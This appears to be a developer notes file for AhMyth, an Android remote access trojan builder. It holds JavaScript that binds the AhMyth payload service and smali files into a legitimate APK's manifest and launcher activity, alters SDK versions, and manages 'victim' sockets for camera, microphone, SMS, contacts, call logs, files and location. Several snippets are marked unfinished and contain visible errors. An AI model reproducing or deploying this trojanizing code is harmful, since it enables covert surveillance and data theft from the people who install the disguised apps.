# Display AhMyth over other applications
```js
mainWindow.setAlwaysOnTop(true, "screen-saver")     // - 2 -
  mainWindow.setVisibleOnAllWorkspaces(true)          // - 3 -
```
# Function to Empty the Apktool Framework Directory
This Code will reduce building failed errors with both Standalone APK payloads and Bound APK Payloads, it empties the apktool framework directory before building any payload everytime
- AppCtrl.js
```js

        // empty the framework directory
        try {
          $appCtrl.Log("Emptying the Apktool Framework Directory")
          $appCtrl.Log();
          exec('java -jar ' + CONSTANTS.apktoolJar + '" empty-framework-dir "', (error, stderr, stdout) => {
            if (error) {
              throw error;
            };
          });
        } catch (error) {
          // ignore the error by doing nothing!
        }

        // Build the AhMyth Payload APK
```

# New Cross platform Bind on Launch function

This one was a bit of a pain to manage, but it was done in the end, this future update will be used in the next release until something using `fs` can be constructed, in order to use less coding.

This new function also fixes a bug that was recently discovered when running AhMyth on Windows machines.
- AppCtrl.js
```js  
    $appCtrl.BindOnLauncher = (apkFolder) => {


      $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
      $appCtrl.Log();
      fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
          if (error) {
              $appCtrl.Log('Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
              $appCtrl.Log();
              return;
          }
  
          var launcherActivity = GetLauncherActivity(data, apkFolder);
          if (launcherActivity == -1) {
              $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
              $appCtrl.Log("Please use Another APK as a Template!.", CONSTANTS.logStatus.INFO);
              $appCtrl.Log();
              return;
          }
  
          var ahmythService = CONSTANTS.ahmythService;
          $appCtrl.Log('Modifying AndroidManifest.xml...');
          $appCtrl.Log();
          var permManifest = $appCtrl.copyPermissions(data);
          var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
          fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
              if (error) {
                  $appCtrl.Log('Modifying AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
                  $appCtrl.Log();          
                  return;
              }
              
              if (process.platform === 'win32') {
                  $appCtrl.Log("Locating Launcher Activity...")
                  $appCtrl.Log();
                  exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
                  + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
                  + ' -file | resolve-path -relative', { 'shell':'powershell.exe' }, (error, stdout, stderr) => {
                  var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
                  if (error !== null) {
                      $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                      $appCtrl.Log();
                      return;
                  } else if (!launcherPath) {
                      $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                      $appCtrl.Log();
                      return;
                  } else {
                      $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                      $appCtrl.Log();
                  }
  
                  $appCtrl.Log("Reading Launcher Activity...")
                  $appCtrl.Log();
                  fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                      if (error) {
                          $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                          $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                          $appCtrl.Log();
                          return;
                          }
  
                          var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
   
                          var hook = CONSTANTS.hookPoint;
                          $appCtrl.Log("Modifiying Launcher Activity...");
                          $appCtrl.Log();
                          var output = data.replace(hook, startService);
                          fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                              if (error) {
                                  $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                                  $appCtrl.Log();
                                  return;
                              }
                              
                              $appCtrl.Log("Determining Target SDK Version...");
                              $appCtrl.Log()
                              fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                if (error) {
                                  $appCtrl.Log("Reading the Manifest Target SDK Failed.")
                                  $appCtrl.Log()
                                }
                                
                                $appCtrl.Log("Modifying the Target SDK Version...");
                                $appCtrl.Log();
                                var compSdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                var VerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                var repXmlSdk = data.replace(compSdkRegex, "$122"+'"').replace(VerCoRegex, "$122"+'"');
                                fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                  if (error) {
                                      $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                      $appCtrl.Log();          
                                      return;
                                    }

                                    fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                      if (error) {
                                          $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
                                          $appCtrl.Log();
                                          return;
                                      }

                                      var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                      var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                      var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                      fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                        if (error) {
                                            $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                            $appCtrl.Log()
                                            return;
                                          }

                                          var regex = /[^/]+\//;
                                          var str = launcherPath;
                                          var m = str.replace(/\\/g, "/").match(regex);
              
                                          var smaliFolder = m[0];
              
                                          $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                                          $appCtrl.Log();
                                          fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                              if (error) {
                                                  $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                                                  $appCtrl.Log();
                                                  return;
                                                }
                                                
                                                $appCtrl.GenerateApk(apkFolder);
                                
                                            });
                                            
                                        });
                
                                    });
                
                                });

                            });

                        });

                    });

                });
  
              } else if (process.platform === "linux") {
                  $appCtrl.Log("Locating Launcher Activity...");
                  $appCtrl.Log();
                  exec('find -name "' + launcherActivity + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
                  var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                  if (error !== null) {
                      $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                      $appCtrl.Log();
                      return;
                  } else if (!launcherPath) {
                      $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                      $appCtrl.Log();
                      return;
                  } else {
                      $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                      $appCtrl.Log();
                  }
  
                  $appCtrl.Log("Fetching Launcher Activity...")
                  $appCtrl.Log();
                  fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                      if (error) {
                          $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                        $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                          $appCtrl.Log();
                          return;
                      }
  
                      var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
   
                      var hook = CONSTANTS.hookPoint;
                      $appCtrl.Log("Modifiying Launcher Activity...");
                      $appCtrl.Log();
                      var output = data.replace(hook, startService);
                      fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                          if (error) {
                              $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                              $appCtrl.Log();
                              return;
                          }


                          $appCtrl.Log("Modifying the Target SDK Version...");
                          $appCtrl.Log();
                          var compSdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                          var VerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                          var repXmlSdk = data.replace(compSdkRegex, "$122"+'"').replace(VerCoRegex, "$122"+'"');
                          fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                            if (error) {
                                $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                $appCtrl.Log();          
                                return;
                              }

                              fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                if (error) {
                                    $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
                                    $appCtrl.Log();
                                    return;
                                }

                                var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                  if (error) {
                                      $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                      $appCtrl.Log()
                                      return;
                                    }
  
                                    var regex = /[^/]+\//;
                                    var str = launcherPath;
                                    var m = str.match(regex);

                                    var smaliFolder = m[0];
            
                                    $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                                    $appCtrl.Log();
                                    fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                        if (error) {
                                            $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                                            $appCtrl.Log();
                                            return;
                                          }
                                          
                                          $appCtrl.GenerateApk(apkFolder);
              
                                          });;

                                      });

                                  });

                              });
  
                          });
  
                      });
  
                  });
  
              } else {
                  (process.platform === "darwin");
                  $appCtrl.Log("Locating Launcher Activity...");
                  $appCtrl.Log();
                  exec('find ' + '"' + apkFolder + '"' + ' -name ' + '"' + launcherActivity + '"', (error, stdout, stderr) => {
                      var launcherPath = stdout.split(apkFolder).pop(".smali").trim("\n").replace(/^\/+/g, '');
                      if (error !== null) {
                        $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                        $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                          $appCtrl.Log();
                          return;
                      } else if (!launcherPath) {
                          $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                          $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                          $appCtrl.Log();
                          return;
                      } else {
                          $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                          $appCtrl.Log();
                      }
  
                      $appCtrl.Log("Fetching Launcher Activity...");
                      $appCtrl.Log();
                      fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                          if (error) {
                              $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAILED);
                              $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                              $appCtrl.Log();
                              return;
                          }
  
                          var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
   
                          var hook = CONSTANTS.hookPoint;
                          $appCtrl.Log("Modifiying Launcher Activity...");
                          $appCtrl.Log();
                          var output = data.replace(hook, startService);
                          fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                              if (error) {
                                  $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                                  $appCtrl.Log();
                                  return;
                              }

                              $appCtrl.Log("Modifying the Target SDK Version...");
                              $appCtrl.Log();
                              var compSdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                              var VerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                              var repXmlSdk = data.replace(compSdkRegex, "$122"+'"').replace(VerCoRegex, "$122"+'"');
                              fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                if (error) {
                                    $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                    $appCtrl.Log();          
                                    return;
                                  }

                                  fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                    if (error) {
                                        $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
                                        $appCtrl.Log();
                                        return;
                                    }

                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                    var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                    fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                      if (error) {
                                          $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                          $appCtrl.Log()
                                          return;
                                        }
  
                                        var regex = /[^/]+\//;
                                        var str = launcherPath;
                                        var m = str.match(regex);
            
                                        var smaliFolder = m[0];
            
                                        $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                                        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                            if (error) {
                                                $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                                                $appCtrl.Log();
                                                return;
                                              }
                                          
                                              $appCtrl.GenerateApk(apkFolder)
                                                  
                                              });

                                          });

                                      });

                                  });
                                  
                              });
  
                          });
  
                      });
  
                  };
  
              });
  
          });
  
      };
```
### Backup Cross Platform Bind On Launch function
```js
$appCtrl.BindOnLauncher = (apkFolder) => {


    $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
    $appCtrl.Log();
    fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
        if (error) {
            $appCtrl.Log('Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
            $appCtrl.Log();
            return;
        }

        var launcherActivity = GetLauncherActivity(data, apkFolder);
        if (launcherActivity == -1) {
            $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
            $appCtrl.Log("Please use Another APK as a Template!.", CONSTANTS.logStatus.INFO);
            $appCtrl.Log();
            return;
        }

        var ahmythService = CONSTANTS.ahmythService;
        $appCtrl.Log('Modifying AndroidManifest.xml...');
        $appCtrl.Log();
        var permManifest = $appCtrl.copyPermissions(data);
        var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
        fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
            if (error) {
                $appCtrl.Log('Modifying AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
                $appCtrl.Log();          
                return;
            }
            
            if (process.platform === 'win32') {
                $appCtrl.Log("Locating Launcher Activity...")
                $appCtrl.Log();
                exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
                + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
                + ' -file | resolve-path -relative', { 'shell':'powershell.exe' }, (error, stdout, stderr) => {
                var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
                if (error !== null) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else if (!launcherPath) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else {
                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log();
                }

                $appCtrl.Log("Reading Launcher Activity...")
                $appCtrl.Log();
                fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                        $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                        $appCtrl.Log();
                        return;
                        }

                        var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
 
                        var hook = CONSTANTS.hookPoint;
                        $appCtrl.Log("Modifiying Launcher Activity...");
                        $appCtrl.Log();
                        var output = data.replace(hook, startService);
                        fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                            if (error) {
                                $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                                $appCtrl.Log();
                                return;
                            }
                            
                            $appCtrl.Log("Determining Target SDK Version...");
                            $appCtrl.Log()
                            fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                              if (error) {
                                $appCtrl.Log("Reading the Manifest Target SDK Failed.")
                                $appCtrl.Log()
                              }
                              
                              $appCtrl.Log("Modifying the Target SDK Version...");
                              $appCtrl.Log();
                              var compSdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                              var VerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                              var repXmlSdk = data.replace(compSdkRegex, "$122"+'"').replace(VerCoRegex, "$122"+'"');
                              fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                if (error) {
                                    $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                    $appCtrl.Log();          
                                    return;
                                  }

                                  fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                    if (error) {
                                        $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
                                        $appCtrl.Log();
                                        return;
                                    }

                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                    var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                    fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                      if (error) {
                                          $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                          $appCtrl.Log()
                                          return;
                                        }

                                        var regex = /[^/]+\//;
                                        var str = launcherPath;
                                        var m = str.replace(/\\/g, "/").match(regex);
            
                                        var smaliFolder = m[0];
            
                                        $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                                        $appCtrl.Log();
                                        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                            if (error) {
                                                $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                                                $appCtrl.Log();
                                                return;
                                              }
                                              
                                              $appCtrl.GenerateApk(apkFolder);
                              
                                          });
                                          
                                      });
              
                                  });
              
                              });

                          });

                      });

                  });

              });

            } else {
                (process.platform === "linux" || process.platfrom === "darwin")
                $appCtrl.Log("Locating Launcher Activity...");
                $appCtrl.Log();
                exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
                + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
                + ' -file | resolve-path -relative', { 'shell':'pwsh' }, (error, stdout, stderr) => {
                var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                if (error !== null) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else if (!launcherPath) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else {
                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log();
                }

                $appCtrl.Log("Fetching Launcher Activity...")
                $appCtrl.Log();
                fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                        $appCtrl.Log();
                        return;
                    }

                    var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
 
                    var hook = CONSTANTS.hookPoint;
                    $appCtrl.Log("Modifiying Launcher Activity...");
                    $appCtrl.Log();
                    var output = data.replace(hook, startService);
                    fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                        if (error) {
                            $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                            $appCtrl.Log();
                            return;
                        }


                        $appCtrl.Log("Modifying the Target SDK Version...");
                        $appCtrl.Log();
                        var compSdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                        var VerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                        var repXmlSdk = data.replace(compSdkRegex, "$122"+'"').replace(VerCoRegex, "$122"+'"');
                        fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                          if (error) {
                              $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                              $appCtrl.Log();          
                              return;
                            }

                            fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                              if (error) {
                                  $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
                                  $appCtrl.Log();
                                  return;
                              }

                              var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                              var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                              var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                              fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                if (error) {
                                    $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                    $appCtrl.Log()
                                    return;
                                  }

                                  var regex = /[^/]+\//;
                                  var str = launcherPath;
                                  var m = str.match(regex);

                                  var smaliFolder = m[0];
          
                                  $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                                  $appCtrl.Log();
                                  fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                      if (error) {
                                          $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                                          $appCtrl.Log();
                                          return;
                                        }
                                        
                                        $appCtrl.GenerateApk(apkFolder);
            
                                        });;

                                    });

                                });

                            });

                        });

                    });

                });

            };

        });

    });

};
```
```js
function GetLauncherActivity(manifest) {


    var regex = /<activity/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf
   (
    '"android.intent.action.MAIN"',
    '"android.intent.category.LAUNCHER"'
    +
    '"android.intent.action.MAIN"',
    '"android.intent.category.INFO"'
    );
    var indexOfActivity = -1;
    
    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfActivity = indices[i];
                manifest = manifest.substring(indexOfActivity, manifest.length);
                break;
            }
        }


        if (indexOfActivity != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                return manifest;

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



  }
```

# Server Updates that still need work

All of the following code updates for the server, currently need more work done on them before they can be integrated.

# Launcher Extraction for `<application` attribute | AppCtrl.js |
```javascript
function GetLauncherActivity(manifest) {


    var regex = /<application/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf(
        'android.intent.action.MAIN'
        'android.intent.category.LAUNCHER',
        +
        'android.intent.action.MAIN'
        'android.intent.category.INFO',
        );
    var indexOfActivity = -1;
    
    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfActivity = indices[i];
                manifest = manifest.substring(indexOfActivity, manifest.length);
                break;
            }
        }


        if (indexOfActivity != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                return manifest;

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



  }
```
# Code for Disconnect function
- AppCtrl.js
```javascript
    // when user clicks Disconnect Button
    $appCtrl.Stop = (port) => {
      if (!port) {
        port = CONSTANTS.defaultPort;
      }
      
      //notify the main process to disconnect the port
      ipcRenderer.send('SocketIO:StopListen', port);
      $appCtrl.Log("Stopped Listening on Port: " + port, CONSTANTS.logStatus.SUCCESS);
    }

    //fired when main process sends any notification about the ServerDisconnect 
    ipcRenderer.on('SocketIO:ServerDisconnect', (event, index) => {
      delete viclist[index];
      $appCtrl.$apply();
    });

    // fired if stopping the listener brings error
    ipcRenderer.on("SocketIO:StopListen", (event, error) => {
      $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
      $appCtrl.$apply()
  });

    //notify the main process to close the lab
    $appCtrl.closeLab = (index) => {
      ipcRenderer.send('closeLabWindow', 'lab.html', index)
    }
```
- main.js
```javascript 
// fired when stopped listening for victim
ipcMain.on("SocketIO:StopListen", function (event, port) {

  IO.close();
  IO.sockets.on('connection', function (socket) {
    // decrease socket count on Disconnect
    socket.on('disconnect', function () {
      victimList.rmVictim(index)

      // notify the renderer process about the Server Disconnection
      win.webContents.send('SocketIO:ServerDisconnect', index);

      if (windows[index]) {
        // notify the renderer process about the Disconnected Server
        windows[index].webContents.send('SocketIO:ServerDisconnected', index);
        // delete the windows from the windowList
        delete windows[index];
      }
    });
  });
});


ipcMain.on("closeLabWindow", function (event, index) {
  delete windows[index];
  //on lab window closed remove all socket listners
  if (victimsList.getVictim(index).socket) {
    victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
    victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
    victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
    victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
    victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
    victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
    victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
  }
});

//handle the Uncaught Exceptions
process.on('uncaughtException', function (error) {

  if (error.code == "EADDRINUSE" || error.code == "ENOTCONN") {
    win.webContents.send('SocketIO:Listen', "Address Already in Use");
  } else {
    win.webContents.send('SocketIO:StopListen', "Server is not Listening");
  } // end of if

});
```
- index.html
```html
<button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
```
